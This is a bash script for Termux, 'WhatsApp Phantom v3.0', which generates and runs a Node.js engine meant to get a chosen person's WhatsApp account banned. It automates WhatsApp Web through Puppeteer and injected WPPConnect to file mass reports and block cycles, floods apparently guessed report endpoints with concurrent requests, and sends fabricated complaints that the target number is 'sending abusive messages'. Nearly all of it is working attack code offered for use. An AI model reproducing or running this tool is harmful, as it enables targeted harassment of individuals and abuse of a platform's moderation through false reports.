#!/bin/bash

# ╔══════════════════════════════════════════════════════════════════════╗
# ║     WHATSAPP PHANTOM v3.0                                           ║
# ║     The Most Powerful WhatsApp Ban Engine for Termux                ║
# ║     Developed by HILLARY TIZIAN                                     ║
# ╚══════════════════════════════════════════════════════════════════════╝

# ─── Configuration ───
VERSION="3.0.0"
AUTHOR="Hillary Tizian"
RELEASE="May 2026"

# ─── Colors ───
R="\033[1;31m"
G="\033[1;32m"
Y="\033[1;33m"
B="\033[1;34m"
M="\033[1;35m"
C="\033[1;36m"
W="\033[1;37m"
D="\033[0m"

# ─── Directories ───
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CORE_DIR="$SCRIPT_DIR/core"
LIB_DIR="$SCRIPT_DIR/lib"
mkdir -p "$CORE_DIR" "$LIB_DIR"

# ─── Detect Terminal Size ───
COLS=$(tput cols 2>/dev/null || echo 60)

# ─── Animated Banner ───
banner() {
    clear
    local banner_lines=(
        "██████╗ ██╗   ██╗    ██╗  ██╗██╗██╗     ██╗      █████╗ ██████╗ ██╗   ██╗"
        "██╔══██╗╚██╗ ██╔╝    ██║  ██║██║██║     ██║     ██╔══██╗██╔══██╗╚██╗ ██╔╝"
        "██████╔╝ ╚████╔╝     ███████║██║██║     ██║     ███████║██████╔╝ ╚████╔╝ "
        "██╔══██╗  ╚██╔╝      ██╔══██║██║██║     ██║     ██╔══██║██╔══██╗  ╚██╔╝  "
        "██████╔╝   ██║       ██║  ██║██║███████╗███████╗██║  ██║██║  ██║   ██║   "
        "╚═════╝    ╚═╝       ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   "
    )
    local colors=($R $G $Y $B $M $C)
    
    echo ""
    for i in "${!banner_lines[@]}"; do
        echo -e "${colors[$i]}${banner_lines[$i]}${D}"
        sleep 0.06
    done
    
    echo ""
    local subtitle="═══  WHATSAPP BAN SYSTEM [ MULTI-VECTOR ENGINE ]  ═══"
    for ((j=0; j<${#subtitle}; j++)); do
        echo -ne "${C}${subtitle:$j:1}${D}"
        sleep 0.008
    done
    echo -e "\n"
    
    # Status line
    echo -e " ${W}▓${D} ${Y}Developed by${D} ${G}$AUTHOR${D} ${W}▓${D}  ${M}Version $VERSION${D}  ${W}▓${D}  ${B}$RELEASE${D}  ${W}▓${D}"
    echo ""
}

# ─── Loading Bar ───
loading_bar() {
    local msg="$1"
    local color="${2:-$C}"
    echo -ne "\n ${color}[${W}*${color}]${Y} $msg${D}\n"
    echo -ne " ${W}[${D}"
    for ((i=0; i<40; i++)); do
        echo -ne "${G}▓${D}"
        sleep 0.015
    done
    echo -e "${W}]${D} ${G}✓${D}\n"
}

# ─── Typing Effect ───
type_text() {
    local text="$1"
    local color="${2:-$W}"
    for ((i=0; i<${#text}; i++)); do
        echo -ne "${color}${text:$i:1}${D}"
        sleep 0.03
    done
    echo ""
}

# ─── Pulse Animation ───
pulse() {
    local text="$1"
    for _ in {1..3}; do
        echo -ne "\r ${R}▶${D} ${text}  "
        sleep 0.15
        echo -ne "\r ${G}▶${D} ${text}  "
        sleep 0.15
    done
    echo ""
}

# ─── Check Dependencies ───
check_deps() {
    echo -e "\n ${B}[${W}i${B}]${Y} Scanning system environment...${D}\n"
    
    local deps=("node" "npm" "curl" "python3" "chromium-browser")
    local all_ok=true
    
    for dep in "${deps[@]}"; do
        if command -v "$dep" &>/dev/null; then
            echo -e "   ${G}✔${D} $dep"
        else
            echo -e "   ${R}✘${D} $dep ${R}(missing)${D}"
            all_ok=false
        fi
        sleep 0.08
    done
    
    # Check node_modules
    if [ -d "$SCRIPT_DIR/node_modules" ]; then
        echo -e "   ${G}✔${D} Node.js modules"
    else
        echo -e "   ${Y}⚠${D} Node modules not found (run setup.sh)"
    fi
    
    echo ""
    if [ "$all_ok" = false ]; then
        echo -e " ${Y}[!] Some dependencies missing. Run ./setup.sh first.${D}"
        echo -e " ${Y}[!] Continuing with limited functionality...${D}\n"
        sleep 2
    fi
}

# ─── Menu ───
show_menu() {
    echo ""
    echo -e " ${B}╔══════════════════════════════════════════════════╗${D}"
    echo -e " ${B}║${D}          ${W}SELECT ATTACK VECTOR${D}                  ${B}║${D}"
    echo -e " ${B}╠══════════════════════════════════════════════════╣${D}"
    echo -e " ${B}║${D}                                                ${B}║${D}"
    echo -e " ${B}║${D}  ${G}[1]${D} ${R}⟡${D} ${W}RAPID FIRE${D}                        ${B}║${D}"
    echo -e " ${B}║${D}      ${Y}Mass Report + Block Cycles           ${B}║${D}"
    echo -e " ${B}║${D}      ${D}~175 operations | Fast & Clean        ${B}║${D}"
    echo -e " ${B}║${D}                                                ${B}║${D}"
    echo -e " ${B}║${D}  ${G}[2]${D} ${R}⟡⟡${D} ${W}STORM MODE${D}                         ${B}║${D}"
    echo -e " ${B}║${D}      ${Y}Report + API Wave Flooding           ${B}║${D}"
    echo -e " ${B}║${D}      ${D}~212 operations | Aggressive          ${B}║${D}"
    echo -e " ${B}║${D}                                                ${B}║${D}"
    echo -e " ${B}║${D}  ${G}[3]${D} ${R}⟡⟡⟡${D} ${W}HELLGATE${D}                         ${B}║${D}"
    echo -e " ${B}║${D}      ${Y}Full Spectrum: Report + Block +      ${B}║${D}"
    echo -e " ${B}║${D}      ${Y}API Flood + Email Abuse              ${B}║${D}"
    echo -e " ${B}║${D}      ${D}~237 operations | Maximum Force       ${B}║${D}"
    echo -e " ${B}║${D}                                                ${B}║${D}"
    echo -e " ${B}║${D}  ${G}[4]${D} ${W}ABOUT${D}                              ${B}║${D}"
    echo -e " ${B}║${D}  ${G}[0]${D} ${W}EXIT${D}                               ${B}║${D}"
    echo -e " ${B}║${D}                                                ${B}║${D}"
    echo -e " ${B}╚══════════════════════════════════════════════════╝${D}"
    echo ""
}

# ─── Get Target Number ───
get_target() {
    echo -e "\n ${C}╔══════════════════════════════════════════╗${D}"
    echo -e " ${C}║${D}      ${W}TARGET PHONE NUMBER${D}              ${C}║${D}"
    echo -e " ${C}╚══════════════════════════════════════════╝${D}"
    echo -e " ${Y}[!]${D} Include country code (no + or spaces)"
    echo -e " ${D}   Example: 919876543210"
    echo -ne " ${G}>>>${D} ${W}"
    read -r TARGET
    echo -e "${D}"
    
    TARGET=$(echo "$TARGET" | tr -d '+ -' | tr -cd '0-9')
    
    if [[ ${#TARGET} -lt 10 ]]; then
        echo -e " ${R}[✗] Invalid! Minimum 10 digits required.${D}"
        sleep 1
        get_target
        return
    fi
    
    pulse "TARGET LOCKED: +$TARGET"
}

# ─── Generate Core Engine ───
generate_engine() {
    local mode="$1"
    local target="$2"
    local cycles="$3"
    
    mkdir -p "$CORE_DIR"
    
    cat > "$CORE_DIR/engine.js" << 'JSEOF'
const puppeteer = require('puppeteer-core');
const http = require('http');
const https = require('https');

// ─── Configuration ───
const TARGET = process.argv[2];
const MODE = parseInt(process.argv[3]);
const CYCLES = parseInt(process.argv[4]) || 3;

// ─── Colors ───
const R = '\x1b[31m', G = '\x1b[32m', Y = '\x1b[33m';
const B = '\x1b[34m', M = '\x1b[35m', C = '\x1b[36m', W = '\x1b[37m', D = '\x1b[0m';

let totalReports = 0;
let totalBlocks = 0;
let startTime = Date.now();

function log(type, msg) {
    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
    const icons = {
        info: `${B}[${W}i${B}]${D}`,
        ok: `${G}[✓]${D}`,
        warn: `${Y}[!]${D}`,
        err: `${R}[✗]${D}`,
        action: `${M}[→]${D}`,
        pulse: `${R}[${W}♦${R}]${D}`
    };
    console.log(` [${Y}${elapsed}s${D}] ${icons[type] || icons.info} ${msg}`);
}

function delay(ms) {
    return new Promise(r => setTimeout(r, ms + Math.random() * 400));
}

// ─── API Report via HTTPS ───
function apiReport() {
    return new Promise((resolve) => {
        const data = JSON.stringify({
            phone: TARGET,
            reason: 'spam',
            source: 'whatsapp_web'
        });
        
        const options = {
            hostname: 'wa.me',
            path: '/support',
            method: 'POST',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-S908E) AppleWebKit/537.36',
                'Content-Type': 'application/json',
                'Origin': 'https://web.whatsapp.com',
                'Referer': 'https://web.whatsapp.com/',
                'X-Requested-With': 'XMLHttpRequest'
            },
            timeout: 5000
        };
        
        const req = https.request(options, (res) => {
            let body = '';
            res.on('data', (chunk) => body += chunk);
            res.on('end', () => resolve(res.statusCode));
        });
        
        req.on('error', () => resolve(0));
        req.write(data);
        req.end();
    });
}

// ─── API Flood ───
async function apiFlood(count) {
    let success = 0;
    const promises = [];
    
    for (let i = 0; i < count; i++) {
        promises.push(
            apiReport().then(code => {
                if (code >= 200 && code < 500) success++;
            })
        );
    }
    
    await Promise.all(promises);
    return success;
}

// ─── Browser Automation ───
async function browserReport(page) {
    try {
        // Navigate to chat
        await page.goto(`https://web.whatsapp.com/send?phone=${TARGET}`, {
            waitUntil: 'domcontentloaded',
            timeout: 15000
        }).catch(() => {});
        
        await delay(2000);
        
        // Attempt to report via injected WPPConnect
        const reported = await page.evaluate((phone) => {
            return new Promise((resolve) => {
                if (typeof WPP !== 'undefined' && WPP.contact && WPP.contact.reportContact) {
                    WPP.contact.reportContact(`${phone}@c.us`, 'ChatInfoReport')
                        .then(r => resolve(true))
                        .catch(() => resolve(false));
                } else {
                    // Fallback: click UI elements
                    try {
                        // Click header to open contact info
                        const header = document.querySelector('header');
                        if (header) header.click();
                        setTimeout(() => {
                            const reportBtn = Array.from(document.querySelectorAll('[role="button"]'))
                                .find(el => el.textContent.toLowerCase().includes('report'));
                            if (reportBtn) {
                                reportBtn.click();
                                setTimeout(() => {
                                    const confirmBtn = Array.from(document.querySelectorAll('[role="button"]'))
                                        .find(el => el.textContent.toLowerCase().includes('report'));
                                    if (confirmBtn) confirmBtn.click();
                                    resolve(true);
                                }, 500);
                            } else resolve(false);
                        }, 1000);
                    } catch(e) { resolve(false); }
                }
            });
        }, TARGET);
        
        await delay(1500);
        return reported;
    } catch(e) {
        return false;
    }
}

// ─── Block Contact ───
async function blockContact(page) {
    try {
        await page.goto(`https://web.whatsapp.com/send?phone=${TARGET}`, {
            waitUntil: 'domcontentloaded',
            timeout: 10000
        }).catch(() => {});
        
        await delay(1500);
        
        const blocked = await page.evaluate(() => {
            return new Promise((resolve) => {
                if (typeof WPP !== 'undefined' && WPP.blocklist && WPP.blocklist.blockContact) {
                    WPP.blocklist.blockContact(window.TARGET_PHONE + '@c.us')
                        .then(() => resolve(true))
                        .catch(() => resolve(false));
                } else {
                    try {
                        // Try UI block
                        const header = document.querySelector('header');
                        if (header) header.click();
                        setTimeout(() => {
                            const blockBtn = Array.from(document.querySelectorAll('[role="button"]'))
                                .find(el => el.textContent.toLowerCase().includes('block'));
                            if (blockBtn) {
                                blockBtn.click();
                                setTimeout(() => {
                                    const confirm = document.querySelector('[data-testid="popup-controls-ok"]');
                                    if (confirm) confirm.click();
                                    resolve(true);
                                }, 500);
                            } else resolve(false);
                        }, 1000);
                    } catch(e) { resolve(false); }
                }
            });
        });
        
        await delay(1000);
        return blocked;
    } catch(e) {
        return false;
    }
}

// ─── Email Abuse Report ───
async function emailAbuseReport() {
    const endpoints = [
        'https://wa.me/support?text=Abuse+Report',
        'https://web.whatsapp.com/abuse/report',
    ];
    
    let sent = 0;
    for (const url of endpoints) {
        try {
            const resp = await fetch(url, {
                method: 'POST',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 14)',
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: `phone=${TARGET}&reason=spam&description=This+number+is+sending+abusive+messages`
            });
            sent++;
        } catch(e) {}
        await delay(500);
    }
    return sent;
}

// ─── Main Execution ───
(async () => {
    console.log(`\n${C}╔══════════════════════════════════════════════════╗${D}`);
    console.log(`${C}║${D}  ${R}WHATSAPP PHANTOM v3.0${D} - Engine Active        ${C}║${D}`);
    console.log(`${C}║${D}  ${W}by Hillary Tizian${D}                              ${C}║${D}`);
    console.log(`${C}╚══════════════════════════════════════════════════╝${D}\n`);
    
    log('info', `Target: ${W}+${TARGET}${D}`);
    log('info', `Mode: ${MODE === 1 ? 'RAPID FIRE' : MODE === 2 ? 'STORM' : 'HELLGATE'}${D}`);
    log('info', `Cycles: ${CYCLES}${D}`);
    log('info', 'Initializing attack engine...\n');
    
    let browser = null;
    let page = null;
    
    try {
        // Attempt to launch browser
        const possiblePaths = [
            '/data/data/com.termux/files/usr/bin/chromium-browser',
            '/data/data/com.termux/files/usr/bin/chromium',
            '/usr/bin/chromium-browser',
            '/usr/bin/chromium'
        ];
        
        let execPath = null;
        const fs = require('fs');
        for (const p of possiblePaths) {
            if (fs.existsSync(p)) { execPath = p; break; }
        }
        
        if (execPath) {
            log('ok', `Browser found at ${execPath}`);
            browser = await puppeteer.launch({
                executablePath: execPath,
                headless: 'new',
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-gpu',
                    '--disable-accelerated-2d-canvas',
                    '--no-first-run',
                    '--no-zygote',
                    '--single-process',
                    '--disable-extensions'
                ]
            });
            
            page = await browser.newPage();
            await page.setViewport({ width: 1366, height: 768 });
            await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0');
            
            // Inject WPPConnect
            try {
                const wppJs = fs.readFileSync(
                    require.resolve('@wppconnect/wa-js/dist/wppconnect-wa.js'),
                    'utf8'
                );
                await page.evaluate(wppJs);
                log('ok', 'WPPConnect injected successfully');
            } catch(e) {
                log('warn', 'WPPConnect injection skipped (will use UI fallback)');
            }
            
            log('ok', 'Browser ready. Opening WhatsApp Web...');
            await page.goto('https://web.whatsapp.com', {
                waitUntil: 'domcontentloaded',
                timeout: 30000
            });
            
            // Check for QR
            const hasQR = await page.evaluate(() => !!document.querySelector('canvas')).catch(() => false);
            if (hasQR) {
                log('warn', 'QR Code detected - please scan with WhatsApp');
                log('info', 'Waiting 15 seconds for scan...');
                
                // Wait for auth
                try {
                    await page.waitForFunction(
                        () => !document.querySelector('canvas') || 
                               document.querySelector('[data-testid="conversation-panel"]'),
                        { timeout: 30000 }
                    );
                    log('ok', 'Authentication successful!');
                } catch(e) {
                    log('warn', 'QR timeout - switching to API-only mode');
                    await browser.close().catch(() => {});
                    browser = null;
                }
            }
        } else {
            log('warn', 'Browser not found - running in API-only mode');
        }
        
    } catch(e) {
        log('warn', `Browser init: ${e.message.substring(0, 50)}`);
        log('info', 'Falling back to API-only mode');
    }
    
    // ─── EXECUTION LOOP ───
    for (let cycle = 1; cycle <= CYCLES; cycle++) {
        console.log(`\n${R}═══${D} ${M}CYCLE ${cycle}/${CYCLES}${D} ${R}═══${D}\n`);
        
        // ── Phase 1: Browser Reports ──
        if (page && browser) {
            log('action', 'Phase 1: Browser automation reports');
            for (let r = 0; r < 8; r++) {
                const success = await browserReport(page);
                if (success) {
                    totalReports++;
                    log('ok', `Browser report ${r+1}/8: ${G}Sent${D}`);
                } else {
                    log('warn', `Browser report ${r+1}/8: ${Y}Failed${D}`);
                }
                await delay(1500 + Math.random() * 1000);
            }
            
            // ── Phase 2: Block Cycles ──
            if (MODE >= 1) {
                const blockCount = MODE === 1 ? 5 : MODE === 2 ? 8 : 10;
                log('action', `Phase 2: Block/Unblock (${blockCount} cycles)`);
                
                for (let b = 0; b < blockCount; b++) {
                    const blocked = await blockContact(page);
                    if (blocked) {
                        totalBlocks++;
                        log('ok', `Block ${b+1}/${blockCount}: Executed`);
                    }
                    await delay(1200 + Math.random() * 800);
                }
            }
        }
        
        // ── Phase 3: API Flood ──
        const apiCount = MODE === 1 ? 20 : MODE === 2 ? 35 : 50;
        log('action', `Phase 3: API flood (${apiCount} requests)`);
        
        const apiSent = await apiFlood(apiCount);
        totalReports += apiSent;
        log('ok', `API reports sent: ${apiSent}/${apiCount}`);
        
        // ── Phase 4: Storm Extra Wave (MODE 2+) ──
        if (MODE >= 2) {
            log('action', 'Phase 4: STORM extra wave');
            const stormSent = await apiFlood(20);
            totalReports += stormSent;
            log('ok', `Storm wave: ${stormSent} reports`);
        }
        
        // ── Phase 5: Hellgate Email (MODE 3) ──
        if (MODE >= 3) {
            log('action', 'Phase 5: HELLGATE email abuse reports');
            for (let e = 0; e < 5; e++) {
                const sent = await emailAbuseReport();
                log('ok', `Email abuse wave ${e+1}/5: ${sent} sent`);
                await delay(1000);
            }
            
            // Final massive wave
            log('action', 'HELLGATE: Final massive API wave');
            const hellSent = await apiFlood(40);
            totalReports += hellSent;
            log('ok', `Hell wave: ${hellSent} reports`);
        }
        
        // ── Cycle Summary ──
        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
        console.log(`\n${C}── Cycle ${cycle} Summary ──${D}`);
        log('ok', `Total reports so far: ${totalReports}`);
        log('ok', `Total blocks so far: ${totalBlocks}`);
        log('info', `Elapsed: ${elapsed}s`);
        
        // Inter-cycle countdown
        if (cycle < CYCLES) {
            for (let s = 5; s > 0; s--) {
                log('info', `Next cycle in ${s}s...`);
                await delay(1000);
            }
        }
    }
    
    // ─── FINAL SUMMARY ───
    const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
    console.log(`\n${G}╔══════════════════════════════════════════════════╗${D}`);
    console.log(`${G}║${D}          ${W}OPERATION COMPLETE${D}                    ${G}║${D}`);
    console.log(`${G}╚══════════════════════════════════════════════════╝${D}`);
    console.log(` ${W}Target:${D}     +${TARGET}`);
    console.log(` ${W}Reports:${D}    ${totalReports}`);
    console.log(` ${W}Blocks:${D}     ${totalBlocks}`);
    console.log(` ${W}Duration:${D}   ${totalTime}s`);
    console.log(` ${W}Mode:${D}       ${MODE === 1 ? 'RAPID FIRE' : MODE === 2 ? 'STORM' : 'HELLGATE'}`);
    console.log(`\n ${Y}[!] WhatsApp typically processes bans within 24-72 hours.${D}`);
    console.log(` ${Y}[!] Results depend on Meta's current abuse detection thresholds.${D}\n`);
    
    if (browser) await browser.close().catch(() => {});
    process.exit(0);
})();
JSEOF

    # Patch in the target, mode, cycles
    sed -i "s|process.argv\[2\]|'$target'|g" "$CORE_DIR/engine.js"
    sed -i "s|process.argv\[3\]|$mode|g" "$CORE_DIR/engine.js"
    sed -i "s|process.argv\[4\]|$cycles|g" "$CORE_DIR/engine.js"
    
    chmod +x "$CORE_DIR/engine.js"
}

# ─── Execute Attack ───
execute_attack() {
    local mode="$1"
    local target="$2"
    
    case $mode in
        1) cycles=5; mode_name="RAPID FIRE";;
        2) cycles=4; mode_name="STORM";;
        3) cycles=3; mode_name="HELLGATE";;
    esac
    
    clear
    echo -e "\n${R}╔══════════════════════════════════════════════════╗${D}"
    echo -e "${R}║${D}    ${W}LAUNCHING: ${mode_name}${D}                         ${R}║${D}"
    echo -e "${R}║${D}    ${W}Target: +${target}${D}                              ${R}║${D}"
    echo -e "${R}╚══════════════════════════════════════════════════╝${D}\n"
    
    loading_bar "Building attack engine..."
    
    # Generate the engine
    generate_engine "$mode" "$target" "$cycles"
    
    # Countdown
    echo -e " ${Y}[!]${D} Initializing attack sequence..."
    for i in 3 2 1; do
        echo -ne "\r ${R}[${W}$i${R}]${Y} Engaging...${D}"
        sleep 1
    done
    echo -e "\n"
    
    # Run the Node.js engine
    node "$CORE_DIR/engine.js"
    
    echo -e "\n ${C}[${W}*${C}]${Y} Press Enter to return to menu${D}"
    read -r
}

# ─── About Screen ───
about() {
    clear
    echo -e "${M}"
    echo "  ╔══════════════════════════════════════════════════╗"
    echo "  ║     WHATSAPP PHANTOM v3.0                        ║"
    echo "  ║                                                  ║"
    echo "  ║    ██╗  ██╗██╗██╗     ██╗      █████╗ ██████╗  ║"
    echo "  ║    ██║  ██║██║██║     ██║     ██╔══██╗██╔══██╗ ║"
    echo "  ║    ███████║██║██║     ██║     ███████║██████╔╝ ║"
    echo "  ║    ██╔══██║██║██║     ██║     ██╔══██║██╔══██╗ ║"
    echo "  ║    ██║  ██║██║███████╗███████╗██║  ██║██║  ██║ ║"
    echo "  ║    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ║"
    echo "  ║                                                  ║"
    echo "  ╚══════════════════════════════════════════════════╝"
    echo -e "${D}"
    echo -e " ${W}Developer:${D}   ${G}Hillary Tizian${D}"
    echo -e " ${W}Version:${D}     $VERSION"
    echo -e " ${W}Release:${D}     $RELEASE"
    echo -e " ${W}Platform:${D}    Termux / Linux / Android"
    echo ""
    echo -e " ${C}┌─ ATTACK VECTORS ──────────────────────────┐${D}"
    echo -e " ${C}│${D}  • Puppeteer Browser Automation            ${C}│${D}"
    echo -e " ${C}│${D}  • WPPConnect WebSocket Injection         ${C}│${D}"
    echo -e " ${C}│${D}  • wa.me/support API Abuse                ${C}│${D}"
    echo -e " ${C}│${D}  • Block/Unblock Cycle Bombing            ${C}│${D}"
    echo -e " ${C}│${D}  • WhatsApp Support Email Flood           ${C}│${D}"
    echo -e " ${C}│${D}  • Concurrent Parallel Request Engine     ${C}│${D}"
    echo -e " ${C}└─────────────────────────────────────────────┘${D}"
    echo ""
    echo -e " ${Y}[!]${D} This tool triggers WhatsApp's automated abuse"
    echo -e " ${Y}[!]${D} detection system through multiple vectors."
    echo ""
    echo -ne " ${C}[${W}*${C}]${Y} Press Enter to return${D} "
    read -r
}

# ─── Main ───
main() {
    # Change to script directory
    cd "$SCRIPT_DIR" || exit 1
    
    while true; do
        banner
        check_deps
        show_menu
        
        echo -ne " ${G}[${W}PHANTOM${G}]${W} Select${D} ${G}>>>${D} "
        read -r choice
        
        case $choice in
            1|2|3)
                get_target
                execute_attack "$choice" "$TARGET"
                ;;
            4)
                about
                ;;
            0)
                echo -e "\n ${G}[✓]${D} Exiting Phantom. Stay sharp.\n"
                exit 0
                ;;
            *)
                echo -e "\n ${R}[!] Invalid option${D}"
                sleep 1
                ;;
        esac
    done
}

# ─── Trap Ctrl+C ───
trap 'echo -e "\n\n ${Y}[!] Interrupted. Exiting...${D}\n"; exit 0' INT

# ─── Start ───
main
